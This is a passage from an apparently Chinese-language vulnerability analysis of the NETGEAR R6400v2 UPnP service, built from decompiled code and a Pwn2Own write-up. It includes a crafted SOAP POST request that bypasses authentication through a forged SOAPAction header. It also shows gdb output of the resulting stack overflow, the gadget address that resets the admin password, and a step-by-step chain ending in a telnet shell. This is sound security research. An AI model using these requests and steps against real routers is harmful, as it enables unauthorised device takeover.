<span class="keyword">else</span></span><br><span class="line">      &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">0x2D</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v12 == <span class="number">0x4E</span> )</span><br><span class="line">        &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0x5C</span> )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_196:</span><br><span class="line">            v8 = sa_parseRcvCmd(v6, v75);  <span class="comment">// (2)</span></span><br><span class="line">            <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>其中，<code>sa_findKeyword()</code>函数主要是根据指定的<code>index</code>在表中查找对应的<code>keyword</code>，对应表的部分内容如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.data:0007D47C dword_7D47C     DCD 0                   </span><br><span class="line">.data:0007D480                 DCD aGetinfo            ; &quot;GetInfo&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007D9EC                 DCD 0xB1</span><br><span class="line">.data:0007D9F0                 DCD aSetdevicenamei     ; &quot;SetDeviceNameIconByMAC&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA14                 DCD 0xB9</span><br><span class="line">.data:0007DA18                 DCD aSetdeviceinfob     ; &quot;SetDeviceInfoByMAC&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA1C                 DCD 0xBA</span><br><span class="line">.data:0007DA20                 DCD aSetnetgeardevi     ; &quot;SetNetgearDeviceName&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA2C                 DCD 0xB6</span><br><span class="line">.data:0007DA30                 DCD aRecoveradminpa     ; &quot;RecoverAdminPassword&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA34                 DCD 0xB8</span><br><span class="line">.data:0007DA38                 DCD aSoaplogin          ; &quot;SOAPLogin&quot;</span><br></pre></td></tr></table></figure><p>综上，通过构造如下所示的<code>SOAP</code>消息，即可到达漏洞点。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:SOAP-ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">SOAP-ENV:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line">SetNetgearDeviceName// SetDeviceNameIconByMAC 或 SetDeviceInfoByMAC 也行</span><br><span class="line"><span class="tag">&lt;<span class="name">NewBlockSiteName</span>&gt;</span>123</span><br><span class="line"><span class="tag">&lt;/<span class="name">NewBlockSiteName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h4><p>在前面的分析中，选择通过<code>case 0</code>中的<code>SetNetgearDeviceName</code>(或<code>SetDeviceNameIconByMAC</code>、<code>SetDeviceInfoByMAC</code>)去触发漏洞，这就涉及到认证绕过漏洞了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">sa_method_check</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> *a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  request_ptr = a1;   <span class="comment">// point to the start of http request</span></span><br><span class="line">  v5 = a2; v6 = a3; v7 = a4; v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = dword_8F5B8;</span><br><span class="line">  LOBYTE(dword_BFEC4) = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)((<span class="keyword">char</span> *)&amp;dword_BFEC4 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  HIBYTE(dword_BFEC4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_8F5B8 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_2BCE0(<span class="number">0x20000</span>, aXmlVersion10En_87, v5, v9);</span><br><span class="line">  v11 = stristr(request_ptr, aSoapaction_0);    <span class="comment">// (1) 查找&quot;SOAPAction:&quot;</span></span><br><span class="line">  <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v12 = aDeviceinfo;</span><br><span class="line">  v13 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(v11 + <span class="built_in">strlen</span>(aSoapaction_0));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )  <span class="comment">// (2) 在表中查找具体的SOAPAction操作, 并获取对应的soap_action type</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v12; dword_9DCF4 = (<span class="keyword">int</span>)v12; v12 += <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span> ( stristr(v13, v14) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v8 == <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      soap_action_index = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  soap_action_index = v8;</span><br><span class="line">LABEL_10:</span><br><span class="line">  <span class="comment">// ...  </span></span><br><span class="line">  v19 = (<span class="keyword">const</span> <span class="keyword">char</span> *)stristr(request_ptr, <span class="string">&quot;Cookie:&quot;</span>);</span><br><span class="line">  v20 = (<span class="keyword">const</span> <span class="keyword">char</span> *)stristr(request_ptr, <span class="string">&quot;SOAPAction:&quot;</span>);</span><br><span class="line">  v21 = (<span class="keyword">size_t</span>)v20;</span><br><span class="line">  v22 = <span class="built_in">strchr</span>(v20, <span class="string">&#x27;\r&#x27;</span>);</span><br><span class="line">  *v22 = v18; v23 = v21; n = v22;</span><br><span class="line">  v24 = stristr(v23, <span class="string">&quot;service:DeviceConfig:1#SOAPLogin&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">  *n = <span class="number">13</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v24 || (v25 = <span class="built_in">strchr</span>(v19, <span class="string">&#x27;\r&#x27;</span>), (v87 = v25) == <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_52:</span><br><span class="line">    <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;unk_D9050, <span class="string">&quot;&quot;</span>, <span class="number">0x13</span>u);</span><br><span class="line">    v44 = inet_ntoa((struct in_addr)v6);</span><br><span class="line">    <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;unk_D9050, v44, <span class="number">0x13</span>u);</span><br><span class="line">    v45 = inet_ntoa((struct in_addr)v6);</span><br><span class="line">    v46 = (<span class="keyword">const</span> <span class="keyword">char</span> *)acosNvramConfig_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v45, v46)  <span class="comment">// (3) 需保证判断条件为false</span></span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate&quot;</span>, <span class="number">0x3A</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; \&quot;urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate\&quot;&quot;</span>, <span class="number">0x3C</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin&quot;</span>, <span class="number">0x34</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; \&quot;urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\&quot;&quot;</span>, <span class="number">0x36</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo&quot;</span>, <span class="number">0x30</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dword_9DCF4, <span class="string">&quot;ParentalControl&quot;</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">LABEL_28:</span><br><span class="line">  <span class="keyword">if</span> ( soap_action_index == <span class="number">-1</span></span><br><span class="line">    || (v31 = (<span class="keyword">const</span> <span class="keyword">char</span> *)dword_9DCF4,</span><br><span class="line">        wrap_vprintf(<span class="number">3</span>, <span class="string">&quot;%s()\n&quot;</span>, <span class="string">&quot;sa_saveXMLServiceType&quot;</span>),</span><br><span class="line">        <span class="built_in">memset</span>(byte_9FA30, <span class="number">0</span>, <span class="number">0x64</span>u),</span><br><span class="line">        (v32 = stristr(request_ptr, <span class="string">&quot;urn:&quot;</span>)) == <span class="number">0</span>)</span><br><span class="line">    || (v33 = (<span class="keyword">const</span> <span class="keyword">void</span> *)stristr(v32 + <span class="number">4</span>, <span class="string">&quot;:&quot;</span>)) == <span class="number">0</span></span><br><span class="line">    || (v34 = stristr(request_ptr, v31)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">    v9 = <span class="number">401</span>;</span><br><span class="line">    <span class="keyword">return</span> sub_2BCE0(<span class="number">0x20000</span>, aXmlVersion10En_87, v5, v9);</span><br><span class="line">  &#125;</span><br><span class="line">  v35 = <span class="built_in">strlen</span>(v31);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_9FA30, <span class="string">&quot;urn:NETGEAR-ROUTER&quot;</span>);</span><br><span class="line">  v36 = <span class="built_in">strlen</span>(byte_9FA30);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;byte_9FA30[v36], v33, v34 + v35 - (_DWORD)v33);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_9FA30, <span class="string">&quot;:1&quot;</span>);</span><br><span class="line">  v37 = sa_processResponse(soap_action_index, request_ptr, v5, v7, v6);  <span class="comment">// (4)</span></span><br></pre></td></tr></table></figure><p>在<code>sa_method_check()</code>函数中，在<code>(1)</code>处查找<code>POST</code>请求中的<code>SOAPAction:</code>头，<code>(2)</code>处在表中查找具体的<code>SOAPAction</code>服务并获取对应的类型(索引?)，表中包含的服务名称及其顺序如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.data:0007E380 aDeviceinfo     DCB &quot;DeviceInfo&quot;,0      </span><br><span class="line">.data:0007E39E aDeviceconfig   DCB &quot;DeviceConfig&quot;,0</span><br><span class="line">.data:0007E3BC aWanipconnectio_0   DCB &quot;WANIPConnection&quot;,0</span><br><span class="line">.data:0007E3DA aWanethernetlin_0   DCB &quot;WANEthernetLinkConfig&quot;,0</span><br><span class="line">.data:0007E3F8 aLanconfigsecur DCB &quot;LANConfigSecurity&quot;,0</span><br><span class="line">.data:0007E416 aWlanconfigurat DCB &quot;WLANConfiguration&quot;,0</span><br><span class="line">.data:0007E434 aTime           DCB &quot;Time&quot;,0</span><br><span class="line">.data:0007E452 aParentalcontro DCB &quot;ParentalControl&quot;,0</span><br><span class="line">.data:0007E470 aAdvancedqos    DCB &quot;AdvancedQoS&quot;,0</span><br><span class="line">.data:0007E48E aUseroptionstc  DCB &quot;UserOptionsTC&quot;,0</span><br><span class="line">.data:0007E4AC aEndOfFile_0    DCB &quot;END_OF_FILE&quot;,0</span><br></pre></td></tr></table></figure><p>为了使得程序能执行到<code>(4)</code>，需要使得<code>(3)</code>处的判断条件不成立，即<code>SOAPAction</code>头部需包含以下三个之一。在<code>(3)</code>处还有一个对<code>ip</code>的判断，但这个似乎不太好伪造。</p><ul><li><code>urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate</code></li><li><code>urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</code></li><li><code>urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo</code></li></ul><p>访问以上3个<code>SOAPAction</code>是无需认证的，似乎到这里直接发送如下<code>POST</code>请求就可以到达溢出漏洞点了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">soap/server_sa/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">SOAPAction</span>: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">SetNetgearDeviceName// SetDeviceNameIconByMAC 或 SetDeviceInfoByMAC 也行</span><br><span class="line">&lt;NewBlockSiteName&gt;123</span><br><span class="line">&lt;/NewBlockSiteName&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><p>但是在<code>sa_processResponse()</code>函数中，在根据<code>soap_action</code>的类型进入分支处理时，<code>urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo</code>和<code>urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</code>这2项会分别匹配对应<code>case</code> 分支的第1条<code>if</code>语句，从而跳转到其他地方，而<code>urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate</code>对应的<code>case</code>分支中的跳转都是跳到其他地方。因此，直接访问以上3个<code>SOAPAction</code>，程序执行流程不会到达溢出漏洞点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __fastcall <span class="title">sa_processResponse</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4, <span class="keyword">char</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">void</span> *)a1; v6 = a2;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:  <span class="comment">// 对应service：DeviceInfo</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0</span>) == <span class="number">1</span> ) <span class="comment">// GetInfo</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_241;  <span class="comment">// (1) &lt;=== 跳转到其他分支</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB1</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceNameIconByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">177</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB9</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceInfoByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">185</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xBA</span>) == <span class="number">1</span> ) <span class="comment">// SetNetgearDeviceName</span></span><br><span class="line">      &#123; v12 = <span class="number">186</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:  <span class="comment">// 对应service：DeviceConfig</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB8</span>) == <span class="number">1</span> ) <span class="comment">// SOAPLogin</span></span><br><span class="line">      &#123; v10 = <span class="number">184</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;  <span class="comment">// (2) &lt;=== 跳转到其他分支</span></span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">7u</span>:  <span class="comment">// 对应service：ParentalControl</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">71</span>) == <span class="number">1</span> ) <span class="comment">// GetAllMACAddresses</span></span><br><span class="line">      &#123; v10 = <span class="number">71</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;  <span class="comment">// (3) &lt;=== 全部跳转到其他分支</span></span><br><span class="line">      <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>那么如何才到达溢出漏洞点且无需认证呢？考虑到在查找<code>SOAPAction</code>服务和<code>SOAPAction</code>对应的关键字时采用的是<code>stristr()</code>函数，即直接进行字符串匹配查找，而没有考虑字符串具体的位置，可以通过发送如下<code>POST</code>请求绕过认证并达到溢出漏洞点。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 省略部分内容</span><br><span class="line"><span class="keyword">POST</span> <span class="string">soap/server_sa</span> HTTP/1.1</span><br><span class="line"><span class="attribute">SOAPAction</span>: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLoginDeviceInfo</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line"><span class="attribute">SetNetgearDeviceName</span></span><br><span class="line"><span class="attribute">&lt;NewBlockSiteName&gt;123456</span></span><br><span class="line"><span class="attribute">&lt;/NewBlockSiteName&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Body&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Envelope&gt;</span></span><br></pre></td></tr></table></figure><p>首先，在<code>sa_method_check()</code>中，在查找<code>SOAPAction</code>服务时，对应的表项<code>DeviceInfo</code>排在<code>DeviceConfig</code>之前，因此会匹配到<code>DeviceInfo</code>，对应的<code>soap_action</code>类型为0。其次，在对<code>SOAPAction</code>头部进行判断时，某个<code>strncmp()</code>会比对成功返回0，使得对应的<code>if</code>条件为<code>false</code>，程序继续执行后会调用<code>sa_processResponse()</code>。在<code>sa_processResponse()</code>中，由于<code>soap_action</code>的类型为0，程序会进入<code>case 0</code>分支，在查找关键字时会匹配到下面的<code>SetNetgearDeviceName</code>，因而会跳到对应的分支继续执行，最终到达溢出漏洞点。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现在可以绕过认证并触发溢出漏洞了，该如何对溢出漏洞进行利用呢？溢出时的<code>crash</code>信息如下，可以看到，寄存器<code>r4</code>~`r8<code>和</code>pc`的内容都被覆盖了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c                                                                   </span><br><span class="line">Continuing.                                                               </span><br><span class="line">                                                                          </span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">Cannot access memory at address 0x63636362                                </span><br><span class="line">0x63636362 in ?? ()                                                       </span><br><span class="line">(gdb) i r                                                                 </span><br><span class="line">r0             0x0      0                                                 </span><br><span class="line">r1             0x662bc  418492                                            </span><br><span class="line">r2             0x662bc  418492                                            </span><br><span class="line">r3             0xbeece355       3203195733                                </span><br><span class="line">r4             0x61616161       1633771873                                </span><br><span class="line">r5             0x61616161       1633771873                                </span><br><span class="line">r6             0x61616161       1633771873                                </span><br><span class="line">r7             0x61616161       1633771873                                </span><br><span class="line">r8             0x62626262       1650614882                                </span><br><span class="line">r9             0x1      1                                                 </span><br><span class="line">r10            0x0      0                                                 </span><br><span class="line">r11            0xbeeccf80       3203190656                                </span><br><span class="line">r12            0x0      0                                                 </span><br><span class="line">sp             0xbeeccbb0       0xbeeccbb0                                </span><br><span class="line">lr             0x24c38  150584                                            </span><br><span class="line">pc             0x63636362       0x63636362                                </span><br><span class="line">cpsr           0x60000030       1610612784                                </span><br><span class="line">(gdb) x/10wx $sp-0x10                                                     </span><br><span class="line">0xbeeccba0:     0x61616161      0x61616161      0x62626262      0x63636363</span><br><span class="line">0xbeeccbb0:     0x00000000      0x0000ff37      0x0000041e      0xbeeccf80</span><br><span class="line">0xbeeccbc0:     0xbeeccf4c      0x00000002                                </span><br></pre></td></tr></table></figure><p>前面提到过，若想要实现任意代码执行，需要解决<code>NULL</code>字符截断的问题。在仅有一次覆盖返回地址的机会时，该如何构造<code>payload</code>呢? 在有限的条件下，<code>Pedro Ribeiro</code>采取了一种巧妙的方式，通过单次覆盖来修改设备管理员账户的密码，而<code>upnpd</code>程序中正好存在这一代码片段。这段代码不依赖于其他的寄存器以及栈空间内容等，跳转执行成功后程序还是会崩溃，但管理员账户的密码已成功修改成<code>password</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; V1.0.4.82 版本</span><br><span class="line">.text:00039A58 LDR             R0, &#x3D;aHttpPasswd ; &quot;http_passwd&quot;</span><br><span class="line">.text:00039A5C LDR             R1, &#x3D;aPassword ; &quot;password&quot;</span><br><span class="line">.text:00039A60 BL              acosNvramConfig_set</span><br></pre></td></tr></table></figure><p>有了管理员账户和密码后，可以登录设备的管理界面，对设备的配置进行修改，但如何获取设备的<code>shell</code>以实现代码执行呢?<code>Pedro Ribeiro</code>指出，在<code>R6700v3</code>型号的设备上，可以通过某种方式开启设备的<code>telnet</code>服务，再利用已有的管理员账号和密码登录，即可获取设备的<code>shell</code>。</p><p><code>Pedro Ribeiro</code>给出的完整利用流程如下：</p><ul><li>结合认证绕过漏洞和缓冲区溢出漏洞，通过发送<code>POST</code>请求来修改管理员账号的密码；</li><li>利用已有的管理员账号和密码，登录web页面，再次修改管理员账号的密码；</li><li>通过向设备的<code>23/udp</code>端口发送<code>telnetenable</code>数据包，以开启<code>telnet</code>服务；</li><li>利用已有的管理员账号和密码，登录<code>telnet</code>服务，即可成功获取设备的<code>shell</code></li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文从补丁比对出发，结合<code>Pedro Ribeiro</code>的<code>write up</code>，对<code>NETGEAR</code> <code>R6400v2</code>型号设备中的<code>UPnP</code>漏洞进行了定位和分析。</p><ul><li>认证绕过：在对<code>SOAPAction</code>头进行解析和处理时，由于缺乏适当的校验，可通过伪造<code>SOAPAction</code>头部来绕过认证，从而访问某些<code>API</code></li><li>缓冲区溢出：在解析和处理<code>POST</code>请求中的数据时，由于缺乏长度校验，通过伪造超长的数据，最终会造成在<code>sa_setBlockName()</code>函数中出现缓冲区溢出</li></ul><p>栈溢出漏洞本身比较简单，但漏洞利用却存在<code>NULL</code>字符截断的问题，在只有一次覆盖返回地址的机会时，<code>Pedro Ribeiro</code>采用了一种巧妙的方式，值得借鉴和学习。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwMy8=">(0Day) (Pwn2Own) NETGEAR R6700 UPnP SOAPAction Authentication Bypass Vulnerability<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwNC8=">(0Day) (Pwn2Own) NETGEAR R6700 UPnP NewBlockSiteName Stack-based Buffer Overflow Remote Code Execution Vulnerability<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" 